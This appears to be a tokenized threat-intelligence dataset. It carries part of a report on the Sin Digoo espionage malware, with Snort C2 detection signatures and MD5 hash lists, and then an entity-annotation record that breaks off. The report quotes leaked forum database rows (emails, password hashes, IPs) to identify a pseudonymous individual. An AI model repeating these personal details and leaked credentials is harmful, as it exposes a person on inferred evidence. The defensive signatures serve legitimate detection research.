["Figure", "12", ".", "Tracing", "the", "connections", "between", "socialup", ".", "net,", "i-tobuy", ".", "com,", "and", "1stsale", ".", "net."], ["Several", "clues", "on", "the", "Internet", "point", "to", "xxgchappy", ",", "or", "ZD", ",", "having", "a", "working", "knowledge", "of", "computer", "programming", ".", "The", "use", "of", "the", "programmers'", "forum", ",", "along", "with", "postings", "to", "that", "site", ",", "indicates", "he", "is", "interested", "in", "code", "related", "to", "hooking", "Windows", "API", "functions", ",", "a", "common", "technique", "used", "in", "malware", ".", "Additionally", ",", "both", "xxgchappy@vip", ".", "sina.com", "and", "king_public@hotmail", ".", "com", "were", "the", "listed", "email", "addresses", "for", "users"], ["of", "the", "\"rootkit", ".", "com\"", "site", ",", "revealed", "when", "that", "site's", "database", "was", "leaked", "in", "2011", "."], ["A", "\"rootkit\"", "is", "a", "program", "used", "for", "hiding", "traces", "of", "malware", "on", "a", "system", ",", "and", "rootkit", ".", "com", "was", "a", "forum", "for", "discussing", "the", "latest", "rootkit", "technolo-"], ["gies", ".", "However", ",", "simply", "having", "an", "account", "on", "rootkit", ".", "com", "does", "not", "imply", "one", "is", "using", "rootkits", "offensively", "\u2014", "many", "anti-malware", "researchers"], ["were", "also", "members", "of", "the", "site", ".", "There", "are", "some", "interesting", "clues", "in", "the", "database", "table", "for", "both", "users", "."], ["The", "nickname", "\"Jeno\"", "appears", "again", "in", "the", "rookit", ".", "com", "user", "database", "entry", "for", "the", "user", "with", "the", "email", "address", "xxgchappy@vip", ".", "sina.com."], ["(7523", ",", "'Jeno','91cec994','Jeno", "Alix','xxgchappy@vip", ".", "sina.com',1,0,"], ["'','','','','','',0,'http://www", ".", "rootkit.com/usericons/Jeno.jpg',''"], [",1265784473,'123", ".", "6.89.98',0,0,0,1265721022,0,0,0,'','0','','','',-1,''),"], ["(23025", ",", "'king-rose','e211f11c0b28434bf7f1c8fb510fa9ae','Club-tom',"], ["'king_public@hotmail", ".", "com',1,1106582903,'','','','','','',0,'',''"], [",1106837367,'61", ".", "51.59.63',0,0,0,1106583113,0,0,0,'BH','19800126',"], ["''", ",", "'','',0,''),"], ["Figure", "13", ".", "Database", "entries", "with", "the", "xxgchappy", "and", "king_public", "email", "addresses", "."], ["In", "the", "entry", "for", "king_public@hotmail", ".", "com,", "we", "see", "the", "nicknames", "\"king-rose\"", "and", "\"Club-tom\"", ",", "but", "even", "more", "interesting", "is", "the", "password", "hash"], ["\"e211f11c0b28434bf7f1c8fb510fa9ae\"", ".", "This", "password", "hash", "appears", "in", "only", "one", "other", "entry", "in", "the", "rootkit", ".", "com", "database:"], ["(20446", ",", "'king-z','e211f11c0b28434bf7f1c8fb510fa9ae','k,z,y',"], ["'wzy_100@hotmail", ".", "com',1,1097652186,'','','','','','',0,'','',1284013010,"], ["'123", ".", "120.127.153',0,0,0,1284013010,0,0,0,'','','','','',0,''),"], ["Figure", "14", ".", "Other", "appearance", "of", "the", "password", "hash", "associated", "with", "king_public@hotmail", ".", "com."], ["From", "this", "evidence", ",", "we", "can", "deduce", "that", "\"king-z\"", "is", "a", "second", ",", "earlier", "account", "of", "king_public@hotmail", ".", "com,", "created", "using", "the", "wzy_100@hotmail", ".", "com", "email", "address", ".", "Even", "more", "interesting", "is", "the", "123", ".", "120.127.153", "IP", "address", "the", "king-z", "account", "used", "to", "log", "in", ".", "This", "IP", "is", "located", "inside", "one"], ["of", "the", "AS4808", "netblocks", "famous", "for", "espionage", "activity", ".", "In", "fact", ",", "it", "is", "remarkably", "close", "to", "123", ".", "120.127.159,", "an", "IP", "used", "by", "Enfal", "C2", "v2", ".", "windowsaupdate.net", "(one", "of", "the", "\"Tawnya", "Grilth\"", "domains)", "on", "September", "27", ",", "2010", ".", "The", "last", "account", "activity", "for", "king-z", "as", "shown", "in", "the", "rootkit", ".", "com"], ["database", "is", "September", "9", ",", "2010", ".", "This", "data", "strongly", "suggests", "that", "king_public@hotmail", ".", "com", "is", "not", "just", "a", "stolen", "account", "used", "to", "register", "a", "domain", ","], ["but", "that", "the", "user", "is", "involved", "in", "the", "espionage", "network", "in", "some", "manner", "."], ["The", "password", "used", "by", "xxgchappy@vip", ".", "sina.com", "does", "not", "appear", "elsewhere", "in", "the", "leaked", "rootkit", ".", "com", "database;", "however", ",", "another", "leaked", "database", "may", "provide", "additional", "clues", "surrounding", "the", "xxgchappy", "personality", "."], ["The"], ["@sina", ".", "com.cn", "(address", "redacted)", "email", "address", "associated", "with", "the", "user", "xxgchappy", "can", "be", "found", "inside", "an", "archive", "posted", "to", "the"], ["\"hackchina", ".", "com\"", "website", "."], ["xxgchappy", "#", "2710", "#"], ["@sina", ".", "com.cn"], ["Figure", "15", ".", "xxgchappy", "reference", "from", "the", "hackchina", ".", "com", "website", "."], ["The", "archive", "contains", "a", "denial-of-service", "attack", "tool", "called", "\"lankiller\"", ".", "Inside", "the", "lankiller", "binary", "is", "the", "following", "comment:"], ["Designed", "for", "lyh", "by", "xxgc-happy", "2002", ".", "3.8"], ["Figure", "16", ".", "Reference", "to", "xxgc-happy", "in", "the", "lankiller", "tool", "."], ["Also", "included", "in", "the", "lankiller", "archive", "is", "a", "README", "file", "that", "describes", "the", "use", "of", "the", "tool", ".", "It", "asks", "the", "user", "to", "email", "the", "author", "at", "either"], ["@sina", ".", "com.cn", "or", "happy@sohu", ".", "com.cn."], ["Figure", "17", ".", "Email", "addresses", "referenced", "in", "the", "lankiller", "README", "file", "."], ["There", "is", "a", "profile", "for", "\"happy\"", "on", "a", "Chinese", "video", "site", "showing", "a", "possible", "photo", "of", "the", "user", ".", "The", "photo", "is", "of", "a", "man", "who", "appears", "to", "be", "in", "his", "early", "twenties", "and", "of", "Asian", "descent", "."], ["Conclusion"], ["The", "Sin", "Digoo", "activity", "is", "only", "a", "limited", "view", "into", "a", "very", "large", "amount", "of", "espionage-by-malware", "that", "is", "happening", "in", "the", "world", ".", "The", "Enfal", ","], ["RegSubsDat", ",", "and", "Murcy", "malware", "families", "possess", "dozens", "of", "defunct", "and", "active", "C2s", ",", "and", "these", "three", "trojans", "are", "only", "a", "tiny", "subset", "of", "the", "malware", "families", "the", "Dell", "SecureWorks", "CTU", "research", "team", "knows", "to", "be", "involved", "in", "espionage", "activity", ".", "Collaboration", "between", "government", ",", "espionage", "malware", "victims", ",", "and", "the", "computer", "security", "industry", "must", "improve", "to", "better", "defend", "against", "this", "undercurrent", "of", "activity", "that", "threatens"], ["to", "undermine", "an", "already", "weakened", "economy", "in", "countries", "around", "the", "world", "."], ["Appendix", "A", "\u2013", "Network", "IDS", "signatures"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"GET|20|\";", "depth:4;"], ["pcre:\"/^GET\\x20", ".", "*\\x2ftrandocs\\x2fnetstate*\\x20HTTP\\x2f1/\";"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;"], ["sid:1111111111;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"GET|20|\";", "depth:4;"], ["pcre:\"/^GET\\x20", ".", "*\\x2f(category2|data\\x2fforum|httpdocs\\x2fmm|trandocs\\x2fmm).*[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[AF0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]"], ["{2}\\x2f(showNumber|WindowTask|ORDERTIP|ComMand\\x2esec|Cmwhite|ComMand\\x2esec|Command", ".", "txt|Query.txt|sunrise|Tiblue|Trblu"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111112;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"POST|20|\";", "depth:5;"], ["content:", "!", "\"|0a|Referer|3a20|\";"], ["pcre:\"/^POST\\x20", ".", "*\\x2fcg[az]\\x2dbin\\x2f(Clnpp5|CMS_ClearAll|CMS_ListImg|CMS_SubitAll|dieosn83|Dskx8|Htrc3|Info|Owpp4|Owpq4|Rwpq1|Trpq8|Trpq8|vip)\\x"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111113;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"Enfal", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"POST|20|\";", "depth:5;"], ["pcre:\"/^POST\\x20", ".", "*\\d{6,12}\\x2ephp\\x20HTTP\\x2f1.*\\r\\n\\r\\n[a-z0-9\\x2d]{4,15}\\x3a[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F09]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}/s\";", "reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111114;)"], ["alert", "tcp", "$HOME_NET", "any", "->", "any", "any", "(msg:\"RegSubsDat", "Trojan", "Activity\";", "flow:established", ",", "to_server;", "content:\"POST|20|\";", "depth:5;"], ["content:\"|2f|log|20|HTTP|2f|1\";"], ["pcre:\"/^POST\\x20", ".", "*\\x2f[A-F0-9]{6}0000\\x2flog\\x20HTTP\\x2f1/\";"], ["reference:url,www", ".", "secureworks.com/research/threats/sindigoo/;", "sid:1111111115;)"], ["Appendix", "B", "\u2013", "Malware", "hashes"], ["MD5", "signatures", "for", "Enfal"], ["0144f8d76662fc382b8eb094eb347e4b"], ["01a5adace93ad5afac400f9589b62607"], ["027d7db3d2a94bb0dfadc71300aaee3e"], ["02857b2b6cc5aa750dbfb6a1088a5239"], ["035f2e58144209ea9973bbe4cad58e15"], ["04cb272bbe383707574005a2999f2fe0"], ["054688eb39ea0cd380bb89b6746abc4f"], ["06572d93d87a8d0fb7e070be79692c87"], ["066be8f9e08acfe8ab1eecb884a73801"], ["071d01bcaadc9df5683a6cfa81736714"], ["084e99653956350210beb13c8ea43c79"], ["09c44fcceb51f9affdb63b0d8f9e4b31"], ["0a5446da47609868101c773e928b36e4"], ["0bbd1f253e928cafa3c9c78cdaa849bd"], ["0c589418274ba97663853d1c6bef3bd1"], ["0ecd791525cc30ced610e81ef67290b0"], ["0ed85a30083fb71452916e14a4b5936a"], ["10162681b64c72834621c6fd68b6501f"], ["106db67336a318b6ee4f3197027df85c"], ["113a066b19737b59ab1e2ad921cf3a03"], ["113bea934d89d0cfdc445489f0eb713d"], ["11696e0f7399986c4978e35f3160c22b"], ["1175fff7b282db3b2b0c8c9517bcd937"], ["11cf5c71ddf9a666d9b470dff21c4ec5"], ["13d82eaadf0a5f6fd2d76b66673efa91"], ["140c69ea9a963100e75497b33820f1da"], ["164e3c7488b70d6db28cf71cbc72b0c2"], ["173ec685aa9f581a03c30866b5021574"], ["17810c2ad162c4726729b3fc3ae8676e"], ["184f2de39a9fcc0039eb9df09c4e75b8"], ["19cddfee52c7b7adf4d5dd3e98e0b0bd"], ["1c1f7b32d5381335b83af545b9eef101"], ["1c2aab24d699c24cec860e73c767bce7"], ["1e95875e6c0f054b62c94d6063ff9eed"], ["1f91d940c42f216cf95e724a034802db"], ["1fa520329a77d01aaaf5808ddf529ce2"], ["21b761b4401d290b9e02fea87f2a9933"], ["2370a2142bc61c520226d188e102a727"], ["241aaa7d73339c1624a27fcce5d1815d"], ["24decc7e98e67e3a6e5d34f284f79124"], ["25710d277596d09e5607f419eb63e11d"], ["272fffde11c97b31cf9de7c1e1816d61"], ["276495490cf16318735f880785203378"], ["2880436cf619a270e6c31d9da6eb426b"], ["289242778ef037e02106a491de38cc1f"], ["2944e486b252112720098860a91788e0"], ["297158cfce8fc76789ca41899f6047ac"], ["2ae27d10e04d229c937c0363c29ed3e8"], ["2bc74b3aff2fd68eb38820bb0760f3a6"], ["2bfd304e3433cb0de9c2f284e9417409"], ["2f2f61d3b8f5064affb11e67ae6320b2"], ["2fd6e2c7fc80ab9a6be6a0eebd09763e"], ["2fdaa46fff13f87dcc22fb9aef9ba338"], ["300dcc10df87a998b08dddd2dbc55a28"], ["30971caaf134d7706c70335f54e3188f"], ["30d075afef4e518f63c0b43b8c764e12"], ["3270d18157131f216468cf7ce53ee8d1"], ["331140c7ffaea93ed807f86720b5929e"], ["331acc687cf2b93fc7bfed257ea54488"], ["33eb9e349ec9e093c54028e7c1cd8b0a"], ["340c9de8ff62134bb0e51c24c0919576"], ["343cef9a8d83afca81918fc317f3ccb8"], ["3447416fbbc65906bd0384d4c2ba479e"], ["34563d4ccf2fdd8a08b05089d82a803b"], ["347906343329916ace3636a541c96f26"], ["34f53d0b59f7cf352aace044abf95df3"], ["35369bf701904b17725429e8cb938645"], ["35ca158ffd5965d68f7ef64ee527a028"], ["3603c2b0262ed71402fe981991ddd614"], ["367459c45eec216b6858e7b2f91e0c99"], ["36b1f9def6a794ae0be8148d149e5fe7"], ["36d10e8d5e95bcfed701df530de2a917"], ["36dccde0de343af9e7f08128900334f2"], ["36e8c4f5b906e2e4cc3d5e64b79b8642"], ["374b6371918ab0ba91e9f3489e5eab19"], ["39762af48276967a54372dca1f89936c"], ["3b159b70f6f6e66db77dd6b57f04ec2f"], ["3b5fdfff3f49f0231586dd4fcca7c25d"], ["3c1c15ac3b1bf3787137685637e33140"], ["3d176273201bb6f07746cd7c5c46166c"], ["3d69e2b0257cebf9bc1a6f788f45fbcb"], ["3e27d880674149d2548b5b36d22570ff"], ["3fd66bcecc804913a016827eba28897a"], ["427259dc60c10ca5586da8d76139cc92"], ["42899a14835c5702af3c2f0abaf64429"], ["4413e592ad3c072fa300f526b83bb644"], ["442c0e4bda0035c34e767d429e7f821b"], ["443ed084c7bb1687825670d0293d3482"], ["453963093fa87f1ecd9be2691d080b0c"], ["45b8270e80fcaa229cfe8e4baf15d9c2"], ["45d07b1a0a6cea3035d448e384b59252"], ["45f565e1b73e723ade1838e2c78867a6"], ["46548ef50b1d64909f77a484bac66de6"], ["46679d05a02e065a5f082d86d7635488"], ["466cbf76ccf76e0a2fb309e9e8433bce"], ["46a9e994658fe49e892c5a5d5740b58a"], ["47bc44ccd673760918c99856a053aca0"], ["48a4a92443dd2595806e9afd76275ea0"], ["48ccdc7a5eec2a0240b28534d501eebb"], ["4943c536c8b06044456af9971a0f54eb"], ["499ad52953d3e12ebcda3f4eec3cad4f"], ["49e0df6cb8abc6d4554829f2cc77ad75"], ["4a828744a96d739815ff40d54bc9d022"], ["4add8281a028c6ea76d369186f787004"], ["4b835d7b89f754f72fa712fd281aa51f"], ["4bb3264ddb68e096bbd11721fea3d2e2"], ["4bc96cf2a63f4bfbc5f24c07329d986d"], ["4cb5033c2b4e19872d2fb98dc9678362"], ["4d84bd418da17f01298df489c251464f"], ["4dc08c921bc81ce89aae397eaa049dda"], ["4f862e38b7db5beebacff59a751b0f59"], ["5098b3d6211a17f315fb33b17e37c9b1"], ["50ecc77c6c831bcd7e0534353f61c479"], ["514c992b5af684efb08ada784f36bce7"], ["57ffbe0560b61ef7da39a29049dfdc45"], ["5b0d5ad64256811a7e8be472f3492d2d"], ["5b382d58d6a890ce696494c304242625"], ["5c26947e42381afa8459b6a91308662e"], ["5c2ebee0d8748e926d015d07c434b409"], ["5c920ea7042f820f46ca8bdeb9a17519"], ["5ccdc66a50b3b101d4038ab23b65196f"], ["5cf7669f0b64b0780159cae4275e75e7"], ["5dbd2ed78f47fd75112b5b8d9a5a2a7d"], ["5f76d78402be896288284c18407957b2"], ["5f84282c7ee466e777665ef72fa258b5"], ["61792bb6aa26ce5e826ee300977825c1"], ["61a605dc9bfcbdc382f528607115b8f1"], ["629dc2675a940e6fd0cfd778f2c3149a"], ["630e9ced15a16aaa464b73481297f40f"], ["63d33065354038eec8b8a386d5bf45bf"], ["6680e19b115c88416b13b5985bf2c32d"], ["66fc71e3f35b3ef21cf524c3be92708c"], ["67ae7ca090aed3841ca1c0ec85d26d2c"], ["687cfc99f09f1cb9b1915135bc57fbbe"], ["68a3e1c03a0ce92a648eea823bfcdd4d"], ["690e6208ccfc960c71175e43c75deee1"], ["6979c05ff1682c6bcff2da5f20350388"], ["69f8825118ea8ab1c671c28298c592aa"], ["6c1fa0a523a751b8d588b75814a46759"], ["6e8994d01ab6837e6baeedbfd9bf45b2"], ["701d95d5d716a726a4316d7352938510"], ["70cf6edb22a2fd5fee7665ad1a260b39"], ["70f167e43ba0c4df744601ace41d29fb"], ["71313fcf3d825ba40375cf62f4777e10"], ["719b1d9e93a6fe2fe0918f029990fbfd"], ["72b9b505ef199fee23db350d6e096340"], ["73802e2bb0c7f821f0959e9a424be35b"], ["744670ca4531f7ceb72a75ae456e8215"], ["74cb2fc990adf24f1da265dd14737d48"], ["7547a4e39ac61eae20c79fa3834d8e2a"], ["7578feae5abb684e691e44a1c82d0b78"], ["7769907450c95de213567408d1c3eb32"], ["79a160fec8c1e34b0188e034dffccfa5"], ["7a1d4cba9ce2a28ef586c27689b5aea7"], ["7a72460b0f3caeaa9a0dd5aa252a3dd5"], ["7bd2cf1a96fe27c301111785799233ea"], ["7c2258469a87138a94eb1a15578df9c1"], ["7c9836391eb08e1cfa33dd1094d2f993"], ["7db483b6dfb3952ce9c29b7bf26e662b"], ["7e0d522932460ea1d9a88a82980b1234"], ["7fd3760a10a79397da3e7f2531a3c165"], ["7fec0946aa04ac5f96c8633565a503a7"], ["80398a1c31cb0fad735d051f22865204"], ["8042b3849217de1ee9181ee9c7338df8"], ["80450d1256eddeece918ef02e9dedcd5"], ["80a8635e966a5fb6924cfd92d18b1829"], ["8198751a915561b30a607b1d2a651f73"], ["81df7dca8b3bb3ae964fa8cfd82de413"], ["81fa811f56247c236566d430ae4798eb"], ["8279af9adb9dcde15f67e4938a32e460"], ["83046fb020b98d6bdc59b6d3135fa293"], ["8330e398c976797e86e23110255774ff"], ["839ead900d516a2fe9ec7dc68c6f91dc"], ["84356ed469c95c1418209bd929640622"], ["84484706048822c4a483d9cdd4ae6136"], ["845f298eeec87f92302146aba04ee108"], ["84a201fa44c3675687ad2b9e3cf0adc1"], ["84b8488ce8d20cab10fe10973429d1b3"], ["84d24967cb5cbacf4052a3001692dd54"], ["85639dd697e36a7eeb7e84e6ddccda46"], ["856de08a947a40e00ea7ed66b8e02c53"], ["858941e84af0d2a102b26497c22265c4"], ["875b9628aee0a7108929ecd57f7e771d"], ["89b61f9100b8135d7356fa864598be7f"], ["89ffcc729bf4b89a298b0dd317228646"], ["8bfc2763ec3141e6215fe9958607b895"], ["8c6d058e3c821ca141cbbbcfe7afe8e8"], ["8ec4fc310915b6db5d62ff476d95fc87"], ["8fbc2220e1f505d3312542ccab2cb103"], ["90506693e1df8190ad657d519551472d"], ["908c8475c451050599909b0212857bbe"], ["90bf1a608159df6c4f11f6366cecb998"], ["912aad79475fd457165b3ae8c362203f"], ["9133dcec65eb468ce226e1fd8accaf4e"], ["923d3c72026a56bb9bc54843a6016854"], ["925cbbd8060770e9175ce0433f03ad81"], ["93cf1393241577797b36d707d4255faa"], ["9604700eb71a14a540ba65429d2f75cd"], ["97769f938619bf888a2750b4f079a134"], ["9883cee2f281ae23c4929e0eba313876"], ["9929a8ba088ec944b07c20e0d38d4355"], ["996cdae702fe1f0b7555764c3f4daadd"], ["99a0e8f84028813def520a9a7791635d"], ["9a09e5acd4050a68ade420fcc79c6c66"], ["9ab8cc0bd5facd7fed939ae8715c0f2f"], ["9ac42be9c350de30415f73471b7ced64"], ["9c909e8f3fdf46d1ab0246218f83dc71"], ["9cc962a7f637aced6117aac78f74bdf5"], ["9d001213c967234aef5207971b3dc084"], ["9d0bc24173b98630f45f6cbb5aef048b"], ["9dda46f5b3be826bf427ad6bbd8171ae"], ["9fe79a8d9901cf773d272b0578c818c7"], ["a03c312ad0309c02e29f3be32738f753"], ["a1a977867a889be58767f3224806aef3"], ["a25a0621c0381bdfe32b3f2ea6975f18"], ["a4cc686615d113aa18e2f984a4d69dc6"], ["a64e9189f49db0c1a1ae53891c8a69ef"], ["a6d45978a7736e6265f0243bb14a4f1d"], ["a6e2d6112100869191f20f49408c9459"], ["a714c1df854f966161192b77ff2f4cd4"], ["a78f479adda756ecea71246b6398ac4b"], ["a83fc05a18e18ba19e93a75ffa6ebd50"], ["a99fb261722f271234c872451512c67f"], ["ab5d5a99c171d3e69490a9a7fbe3645f"], ["ac1d99f4751ae8c28c452ae96d6bc800"], ["ac7eccfce8dd486b830fe85dacaf35e8"], ["ad7f7ce329139ccc252ed75704de2eab"], ["ad92cbb5e3522fc4bfc15732284020d0"], ["adab08e09dec4437be49a9346244375a"], ["addd471dcbff1b125f993343a27819a7"], ["ae4c9c1f16fbe20dd78da605f2091ad3"], ["ae60f66d33259207e54ce03416c10adc"], ["af5d3789bb5220553e7fc0d115be4655"], ["b2c52b2078060c0d8dfe3f9c84ab0f1a"], ["b60c862f6435247c21c7d2d05d804248"], ["b9685cc3d0069135696fe51fd7258aac"], ["ba2532bc122c881bfe4ddc39da1dfdf4"], ["ba3324571e0f962e4d6aced7832f4d3f"], ["bdfb76d4dd25ee3b4d36172a3c3cd98e"], ["be7d72c4bb76831089176dd90188ad3e"], ["bf0ad3625fd7cd2c8a7ba3fa74bf1605"], ["bf35c5cb6763679914f267be25a54601"], ["c0c04f41a823cdb4055b109dbadddd18"], ["c1a8179ef14ae95d809179185bcc269f"], ["c1ab14ce4612256bfc93c7b97e5f8353"], ["c2b975caad371568904a04bbb9bf6e17"], ["c3053ece751f9c0b2595a6d9350f48cf"], ["c39183372160e75c7083a5c9eac68124"], ["c3bac79122923eac3f1fd48c5775465d"], ["c47fe9b7a3b72937adeb665432aeeff5"], ["c4a6b6cf35ebed6d46eb5728a6247448"], ["c524005b6f98f5428c228a9577e20f91"], ["c576be490ae4b095149114b34c96c6a9"], ["c5da1da605a6bfc4bf99721e6d665b8d"], ["c6e5277717d0aa2ecd96e9ca06b195d1"], ["c729c36ad0e32be7b23ad022ab8de27c"], ["c7a7c668d4e5c80605bac305799d6ff2"], ["c8a1c24bcd91ca21e89888e418153472"], ["cd5ecadb214f3697d3c77e42c80aff71"], ["d030c4df015cff67353065c0f7198058"], ["d0b9b5889b3bc49ce4c4f942eef7e39f"], ["d0d614ca7bf6745ad52910da8a672e1c"], ["d1568b36e55fae5eb1b7a2ae3b9294f3"], ["d1f641b6dd8861598af23557a7a52a3b"], ["d414ce56e89e1db9df28c3dd388a8249"], ["d415b7a5d328e32a0c383ce3889468af"], ["d4baba6857f3682eeb8ae6f83cc9a271"], ["d4f1188e75c55444a191649c4b4e1362"], ["d541a9cca5288876676aae2ab962997f"], ["d57379739354b204898149b456e732b3"], ["d68d241572a8ffdc8a2e481c96baacfb"], ["d837313adef94c3b173e0a9128896250"], ["d84ecca01839642a27d29f885b885ff1"], ["d8815fe64eb5321add412554908da28a"], ["d8ca81ee8327d8314121d1560800674c"], ["d8f21a32f7d33b1b6b5e948029410eb4"], ["db3d36f3f8386f993a89c9bba25cbeaa"], ["dd260e8a5462304621001dd3c12e4aa8"], ["ddedcf6f543104a3485406d66068e263"], ["dec5441851026a66a4ff0cfd008983c0"], ["df87fe27fcda6906ae248663e0c62861"], ["dfa055d94e59afa791b0f99ff82b54a6"], ["e0417547ba54b58bb2c8f795bca0345c"], ["e1833932053171da15c60e6c2fca708a"], ["e21c8e1c3e79d669f13f771dbbe0eb77"], ["e22632b517305aab6ba9691507d1d562"], ["e31912492ef1edae863b34a96d8c529e"], ["e38d44d1a226b9c1ca70a3e78beaf735"], ["e3ead43315bcc851656805922309744f"], ["e5d96aa540dd934aec72dcecafd366b8"], ["e5ea0c7a48967202f25fc96d91a1a2cb"], ["e61b128e97a39fe869cf89be571fe021"], ["e691dc42a002e9f48f69cd33b70d8a15"], ["e7f5a93eb76bab40d4aa088fba115aaf"], ["e7f93c894451ef1fdefa81c6b229852c"], ["e8664b135b6d681c812aa04ba14a120c"], ["e875d971524d45c10cf332ebf7256688"], ["eb0e2d5ebf6f3dbb4510b85c30a9751d"], ["eb1dc493f005059c654817d153f7ee74"], ["edbc569b5b5824a53721b71ad325a212"], ["edfcb5ec135c94b77e4b94c2a82863b7"], ["ee3ac02b6ca3d6c9012604d71017058f"], ["eebfa7677dedd10edf4aca985f16284c"], ["f03594793c06a097e4b1ac7e1d7079b8"], ["f09e2e3a57d336cb65acab2bdd6b9d14"], ["f1bb8a80e23b6c90004d97c7ef2d0454"], ["f2627bf17528011130e5818bfac0afdb"], ["f2a405326747245e5db97c60e878660b"], ["f34195a2317bf079844bc44c92297cae"], ["f36007400f0c85784fd374ad4ed23c6e"], ["f362f47eb844f889bafd5a0e92c7cdf0"], ["f3b95dad321a14500154e13cf3fbefe4"], ["f3d302a8c56ea86d429157fde1793210"], ["f50406b902601b005c1908a048489ca2"], ["f50fa07be0222baffff05b23fdfd5b68"], ["f5b65b971509eefa009d032003410faf"], ["f77aff1d1c0d94cc96828fb88f3280f3"], ["f7e3b90592c75a6c3c15336d34d97a9e"], ["f9e64eba7185c266786857d7f933577b"], ["fa3f412be4ebf45f478135221365dda7"], ["fa7641771280db462f088d8353dbcfbd"], ["fb11225f453365af4958f98bde2ce918"], ["fc5364e8274a2eb8310d2528d78ac07e"], ["fe4d6a3428cd9f87d5a7044d733d2299"], ["ff271c14549b133a4475ad6615e894da"], ["MD5", "signatures", "for", "RegSubDat"], ["01355596ec3596aa02b8c5f9f1adb5d6"], ["030d492c8d12434144f9b1dc97928cb8"], ["0434ae7b8267b08bd1c6ae17d6100353"], ["048a3815cbf0b8dc9b4c3f680fcd913f"], ["06054346974f309e1003faabac0d1dd5"], ["0836b4a02971aaef33905a91799063ed"], ["09e372c29e69e1edd29f02d4e660d33f"], ["0cafb41eca73d768091bc93f4343cbb9"], ["1050edb8cc0a073991bc637d590d89cc"], ["12954f97e5db1cc86ecfe12be2ec7323"], ["18f9d0973e60b13e7e28d0997e3a09e0"], ["237d641b8267867b007ec94e0bbeff1a"], ["2f6257eab8d3393ac6a96c490f1455ee"], ["351f1ee0cc65d004d40183a7fb6ce616"], ["36310e65b35780242d326f3f604b4c3f"], ["3da70425c099ad4c050eaa4c3308d0cf"], ["48c2d771e3083267a4f9e359ef0e53e5"], ["49b7bc9ac3800caa49bca0a4b3350dbd"], ["4ae7ac0060b938c50675ee2627e3c66d"], ["52856c1a0c63509bf6c00ef1e9fca03c"], ["58cde4ee026df987340a63cfc2c34318"], ["5d53c97b800ca1519800b872bc3f9edf"], ["5d88a3f713c610364fbf750f24af8257"], ["646abf38720c7301698c32bec62d84ce"], ["67d14ce17d3dab4a00d073b6315efc94"], ["69f8d66ccd7fc63ee3f8a3e4f7d86f07"], ["7019e8a17360a583931fb0908f31a2e2"], ["7f7bf881da34242dd1927fda745812f1"], ["81433a87eac3af2227623bf3239844de"], ["83976d6937ebf841999f10bee38ab252"], ["8b1c6478d620bfafbb2c5402d1f926c0"], ["91c3ec270cca27a3785ac827a336c050"], ["94d75acfc4c82c6e48e68b513ade057c"], ["992fa71f3b5e4b1ca3a43d5b2a69e1c0"], ["9a7f048e0e0d0f5bf117f19caef2db1f"], ["9aa7d5ede53be461ab8c4d68fcaa50ab"], ["9ec7da6881d2632a2e823176e915634b"], ["9ef570a298116ac810fdde31a64c7631"], ["a33ab32eeb02b677f9f2786dc3c0651c"], ["a3a1ea2c99d40620fc8dee0222228f24"], ["a876acf60d6e4c4da1123fc11f01ced7"], ["aa90c8e524edb644286c5c0f6c5de987"], ["af0aa267ced776b99a7d157294ac59ba"], ["afd476bbc24a7f20afb017f6869fda65"], ["b5b51dc06c3e9104fa59642952e69d49"], ["b6352cc6e269277960a8da7c5f0306cd"], ["c5860171f919761db9ee78ef3dac5ab4"], ["c6a8c1cdeff0745427aafc588db9c59f"], ["caf90ceece7242bb1147019daf14598f"], ["cc683fc365ec57eea4bc8e1f80a66413"], ["ce47cb6268087cf5c27d77259496989c"], ["cff8e4eb16d010bcc33ad19eb807bd27"], ["d408c2e627b3a895868bf16a3b228eac"], ["dcb3b9ea717603bf6f42e7ce61ea3728"], ["dd1e6b39afcba13b3df3eae13f26d888"], ["e2aa3ca52b8ea17c4bb80d294fec8ec5"], ["e78cc8790ff97eb13d448c15f3f3acae"], ["ea20365eb2142afb4ab9a124808cb8c6"], ["ecf15cce8bd4d6907d86ccff932b64af"], ["ef80d287bd10af3b1cab06d01795ae1a"], ["f5437d13428440412cbf5522adb25f8f"], ["f9d2fec1684529f580785dda5820b372"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "HANGOVER", "sent_id": 0, "pos": [1]}, {"old_id": "T2", "type": "Country", "name": "India", "sent_id": 2, "pos": [12]}, {"old_id": "T3", "type": "ExploitTargetObject", "name": "Pakistan", "sent_id": 5, "pos": [7]}, {"old_id": "T4", "type": "ExploitTargetObject", "name": "United States", "sent_id": 5, "pos": [12, 13]}, {"old_id": "T5", "type": "Organization", "name": "Telenor", "sent_id": 6, "pos": [9]}, {"old_id": "T6", "type": "Time", "name": "March 17 2013", "sent_id": 8, "pos": [1, 4]}, {"old_id": "T7", "type": "Exploit", "name": "Spear phishing emails", "sent_id": 9, "pos": []}, {"old_id": "T8", "type": "Organization", "name": "Norman Shark", "sent_id": 11, "pos": [7, 8]}, {"old_id": "T9", "type": "Campaign", "name": "HangOver", "sent_id": 14, "pos": [0]}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "Pakistan", "sent_id": 18, "pos": [34]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "Iran", "sent_id": 18, "pos": [36]}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "United States", "sent_id": 19, "pos": [0, 1]}, {"old_id": "T13", "type": "Campaign", "name": "Hangover", "sent_id": 27, "pos": 